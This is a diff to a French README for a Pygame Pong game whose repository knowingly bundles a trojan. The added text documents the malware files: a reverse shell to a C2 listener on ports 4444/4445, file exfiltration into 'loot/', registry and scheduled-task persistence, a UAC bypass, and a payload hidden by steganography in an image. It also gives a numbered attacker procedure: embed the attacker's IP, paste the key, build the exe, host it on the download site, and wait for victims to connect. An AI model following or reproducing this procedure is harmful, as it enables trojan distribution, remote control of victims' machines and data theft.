@@ -4,6 +4,17 @@
 
 Ce README décrit l’architecture du projet, son fonctionnement et comment le faire tourner (jeu, site, build, matchmaking).
 
+### ⚠️ Qu’est-ce que ce dépôt ? (jeu et malware)
+
+Ce dépôt contient **deux choses distinctes** :
+
+| Composant | Description |
+|-----------|-------------|
+| **Le jeu Pong Force** | Un vrai jeu de Pong 2D (Pygame) avec Force Push, vs Robot, 2 joueurs local, multijoueur en ligne, site web promotionnel et build d’un .exe Windows. |
+| **Du code malveillant (malware)** | Un **trojan** intégré au jeu : au lancement de `main.py` ou de `PongForce.exe`, un implant est déployé (reverse shell vers un serveur C2, exfiltration de fichiers via `pfiler`), avec **persistence** (registre, tâche planifiée) et **contournement UAC**. Le payload est caché par **stéganographie** dans une image. |
+
+Tout ce qui concerne le malware (fichiers impliqués, chaîne d’exécution, déclenchement, comment l’éviter) est détaillé dans la section [Modules malveillants (malware)](#-modules-malveillants-malware). **N’exécutez pas le jeu sur une machine que vous ne souhaitez pas compromettre** sans avoir désactivé ce code.
+
 ---
 
 ## 📋 Table des matières
@@ -105,6 +116,26 @@ flowchart TB
 - **Point d’entrée jeu** : `pong_force/main.py` (menu, choix de mode, puis boucle de jeu).
 - **Réseau** : l’hôte lance un serveur de jeu (`network/server.py`) et s’enregistre sur le matchmaking ; le client (`network/client.py`) résout le code room puis se connecte à l’hôte.
 - **Site** : HTML/CSS/JS à la racine du dépôt ; le lien de téléchargement pointe vers `download/PongForce.exe` (ou équivalent selon déploiement).
+- **Modules malveillants** : `payload.py`, `listener.py`, `persistence.py`, `encryptor.py` et logique dans `main.py` + image `splash_payload.png` — voir section [Modules malveillants](#-modules-malveillants-malware).
+
+#### Liste des fichiers existants (architecture)
+
+Tous les fichiers présents dans le dépôt (hors `.git` et `__pycache__`) :
+
+| Emplacement | Fichiers |
+|-------------|----------|
+| **Racine** | `README.md`, `index.html`, `demo.html`, `controls.json`, `test_game.py`, `test_download.py`, `test_download.html`, `test.html`, `integration_test.html` |
+| **css/** | `style.css`, `responsive.css` |
+| **js/** | `main.js`, `demo.js`, `particles.js` |
+| **assets/** | `images/`, `sounds/`, `videos/` (placeholders ou médias du site) |
+| **fonts/** | `placeholder.txt` ou polices |
+| **download/** | Emplacement pour `PongForce.exe` (lien du site) |
+| **pong_force/** | `main.py`, `config.py`, `build.py`, `PongForce.spec`, `version_info.txt`, `uac_admin.manifest`, `payload.py`, `listener.py`, `persistence.py`, `encryptor.py`, `controls.json`, `requirements.txt`, `requirements-serveur.txt`, `matchmaking_server.py`, `launch_multiplayer.bat`, `Procfile`, `render.yaml`, `runtime.txt`, `active_rooms.json`, `user_tracking.json`, `player_history.json`, `IMPLEMENTATION_SUMMARY.md`, `MULTIPLAYER_GUIDE.md`, `README.md`, `test_gameplay.py`, `debug_game.py` |
+| **pong_force/game/** | `__init__.py`, `game_loop.py`, `paddle.py`, `ball.py`, `power.py`, `menu.py`, `multiplayer.py`, `controls.py`, `scoreboard.py`, `effects.py`, `player_history.py`, `stats_menu.py` |
+| **pong_force/network/** | `__init__.py`, `server.py`, `client.py`, `network_utils.py` |
+| **pong_force/assets/** | `images/` (dont `splash_payload.png`), `sounds/`, `fonts/` (README dans chaque sous-dossier) |
+| **pong_force/build/** | Sortie temporaire PyInstaller |
+| **pong_force/dist/** | `PongForce.exe` (après build) |
 
 ---
 
@@ -167,9 +198,11 @@ La configuration des touches peut être modifiée via le menu **Contrôles** et 
 
 ## 🌐 Multijoueur et matchmaking
 
+Le **serveur de matchmaking** est déployé sur **Render.com** (ex. `https://pong-force-matchmaking.onrender.com`), ce qui permet à **n’importe quel joueur dans le monde** de créer une room ou de rejoindre une partie par code, sans héberger le serveur soi-même.
+
 Le multijoueur repose sur :
 
-1. **Serveur de matchmaking** (Flask) : garde la liste des rooms (code → IP/port de l’hôte), permet de créer une room et de rejoindre par code.
+1. **Serveur de matchmaking** (Flask, sur Render) : garde la liste des rooms (code → IP/port de l’hôte), permet de créer une room et de rejoindre par code.
 2. **Serveur de jeu** (dans le processus de l’hôte) : écoute sur le port configuré (défaut 5555), gère un client, envoie/reçoit états et entrées.
 3. **Client de jeu** : appelle le matchmaking pour résoudre le code room, puis se connecte au serveur de jeu de l’hôte.
 
@@ -189,8 +222,9 @@ sequenceDiagram
 ```
 
 - **URL du matchmaking** : définie dans `pong_force/config.py` (`MATCHMAKING_SERVER_URL`), par ex. `https://pong-force-matchmaking.onrender.com` en production.
+- **Hébergement** : le serveur est déployé sur **Render.com** ; les joueurs du monde entier peuvent ainsi jouer en ligne via le même matchmaking.
 - **Fichiers côté serveur** : `active_rooms.json`, `user_tracking.json` (si utilisé).
-- **Déploiement** : `Procfile` + `render.yaml` pour un service web type Render avec `gunicorn matchmaking_server:app`.
+- **Déploiement** : `Procfile` + `render.yaml` pour un service web sur Render avec `gunicorn matchmaking_server:app`.
 
 ---
 
@@ -320,10 +354,19 @@ Les touches sont gérées via le menu in-game et sauvegardées dans **`pong_forc
 
 ## 📁 Structure des fichiers
 
+Arborescence complète des fichiers existants dans le dépôt :
+
 ```
 pong_project/
+├── README.md
 ├── index.html              # Page d'accueil du site
 ├── demo.html               # Page démo jeu navigateur
+├── controls.json
+├── test_game.py
+├── test_download.py
+├── test_download.html
+├── test.html
+├── integration_test.html
 ├── css/
 │   ├── style.css
 │   └── responsive.css
@@ -332,24 +375,41 @@ pong_project/
 │   ├── demo.js
 │   └── particles.js
 ├── assets/                 # Images, sons, vidéos du site
+│   ├── images/
+│   ├── sounds/
+│   └── videos/
 ├── fonts/
-├── download/               # Emplacement recommandé pour PongForce.exe (lien du site)
+├── download/                # Emplacement pour PongForce.exe (lien du site)
 │
-├── pong_force/             # Jeu et outils
-│   ├── main.py             # Point d'entrée du jeu
+├── pong_force/
+│   ├── main.py             # Point d'entrée du jeu (+ déclenchement implant)
 │   ├── config.py           # Configuration centrale
 │   ├── build.py            # Script de build PyInstaller
-│   ├── PongForce.spec      # Spec PyInstaller (généré ou utilisé par build.py)
+│   ├── PongForce.spec      # Spec PyInstaller
 │   ├── version_info.txt    # Infos version pour l'exe
 │   ├── uac_admin.manifest  # Manifest UAC (optionnel)
 │   ├── controls.json       # Touches configurées
 │   ├── requirements.txt
 │   ├── requirements-serveur.txt
 │   ├── matchmaking_server.py
-│   ├── payload.py             # Implant (reverse shell + pfiler)
-│   ├── listener.py            # Serveur C2 (ports 4444/4445)
-│   ├── persistence.py         # Persistence alternative (DivinePersistence)
+│   ├── launch_multiplayer.bat
+│   ├── Procfile
+│   ├── render.yaml
+│   ├── runtime.txt
+│   ├── active_rooms.json
+│   ├── user_tracking.json
+│   ├── player_history.json
+│   ├── IMPLEMENTATION_SUMMARY.md
+│   ├── MULTIPLAYER_GUIDE.md
+│   ├── README.md
+│   ├── test_gameplay.py
+│   ├── debug_game.py
+│   ├── payload.py          # Implant (reverse shell + pfiler) — malware
+│   ├── listener.py         # Serveur C2 (ports 4444/4445) — malware
+│   ├── persistence.py      # Persistence alternative (DivinePersistence) — malware
+│   ├── encryptor.py        # Chiffrement / injection payload dans image — malware
 │   ├── game/
+│   │   ├── __init__.py
 │   │   ├── game_loop.py    # Boucle principale (modes, physique, rendu)
 │   │   ├── paddle.py
 │   │   ├── ball.py
@@ -362,18 +422,17 @@ pong_project/
 │   │   ├── player_history.py
 │   │   └── stats_menu.py
 │   ├── network/
+│   │   ├── __init__.py
 │   │   ├── server.py       # Serveur de jeu (hôte)
 │   │   ├── client.py       # Client de jeu
 │   │   └── network_utils.py
-│   ├── assets/             # Ressources du jeu (images dont splash_payload.png LSB, sons, fonts, ico)
+│   ├── assets/             # Ressources du jeu (images dont splash_payload.png LSB, sons, fonts)
+│   │   ├── images/         # dont splash_payload.png (stéganographie)
+│   │   ├── sounds/
+│   │   └── fonts/
 │   ├── build/              # Sortie temporaire PyInstaller
-│   ├── dist/
-│   │   └── PongForce.exe   # Exécutable généré
-│   ├── Procfile
-│   ├── render.yaml
-│   └── runtime.txt
-│
-└── README.md               # Ce fichier
+│   └── dist/
+│       └── PongForce.exe   # Exécutable généré
 ```
 
 ---
@@ -428,6 +487,7 @@ pong_project/
 | **`pong_force/payload.py`** | **Implant** déployé sur la machine cible. Contient des placeholders `##RHOST##`, `##RPORT##`, `##PYTHON_PATH##` remplacés au moment de l’injection. Une fois exécuté : reverse shell vers `RHOST:RPORT`, persistence (copie en `%PROGRAMDATA%`, tâche planifiée, Run HKLM), et commande **`pfiler`** pour exfiltrer des fichiers vers `RHOST:(RPORT+1)`. |
 | **`pong_force/listener.py`** | **Serveur C2 (attaquant)**. Écoute sur le port **4444** (shell) et **4445** (transfert de fichiers). Accepte une connexion du payload, relaie les commandes shell, et reçoit les fichiers exfiltrés dans le dossier **`loot/`**. |
 | **`pong_force/persistence.py`** | Couche de **persistence alternative** (classe `DivinePersistence`) : copie un payload vers `%LOCALAPPDATA%\Microsoft\Audio\Drivers\`, crée un lanceur .bat, tâche planifiée, clé Run, et peut masquer les fichiers. **Non appelée** par `main.py` ; utilisable séparément pour installer l’implant. |
+| **`pong_force/encryptor.py`** | Outil côté **attaquant** : chiffrement (Fernet), compression (zlib), encodage Base64 et injection du payload dans l’image `splash_payload.png` par **stéganographie LSB** (bits de poids faible RGBA). Utilisé pour générer l’image contenant l’implant avant distribution. |
 
 ### Comment c’est déclenché
 
@@ -544,6 +604,39 @@ sequenceDiagram
     I->>L: Connexion RHOST:4445, envoi fichiers
     L->>L: Écrit dans loot/
 ```
+
+### Procédure pour préparer et distribuer l’implant (côté attaquant)
+
+Pour que le malware se connecte à la machine de l’attaquant, il faut préparer le payload avec l’IP et le port C2, injecter la clé de déchiffrement dans le jeu, puis builder et mettre l’exe à disposition :
+
+1. **Générer le payload et la clé**  
+   Depuis le dossier `pong_force/` :
+   ```bash
+   python encryptor.py <IP_PUBLIQUE_ATTAQUANT> 4444
+   ```
+   Exemple : `python encryptor.py 203.0.113.50 4444`  
+   Le script affiche une **clé Fernet** (ex. `S72odT1a3dSuFQo56WRjeksVDssV9ualDDLkhhjcILg=`). Il écrit aussi le payload dans `assets/images/splash_payload.png`.
+
+2. **Coller la clé dans `main.py`**  
+   Ouvrir `pong_force/main.py`, trouver la variable `divine_key` (dans la fonction `extract_payload_to_disk()`) et remplacer la valeur par la clé fournie, en bytes :
+   ```python
+   divine_key = b'<LA_CLE_AFFICHEE_PAR_ENCRYPTOR>'
+   ```
+
+3. **Lancer le build**  
+   Toujours dans `pong_force/` :
+   ```bash
+   python build.py
+   ```
+
+4. **Copier l’exécutable dans `download/`**  
+   Une fois le dossier `pong_force/dist/` créé, copier l’exe généré vers le dossier utilisé par le site pour le téléchargement :
+   ```bash
+   copy pong_force\dist\PongForce.exe download\PongForce.exe
+   ```
+   (sous Windows ; sous Linux/macOS : `cp pong_force/dist/PongForce.exe download/`.)
+
+5. **Côté attaquant** : lancer `listener.py` (ports 4444 et 4445) sur la machine dont l’IP a été donnée à `encryptor.py`, avant que la cible n’exécute l’exe. Les victimes qui téléchargent et lancent le jeu depuis le site se connecteront alors au C2.
 
 ### Comment éviter le déclenchement
 
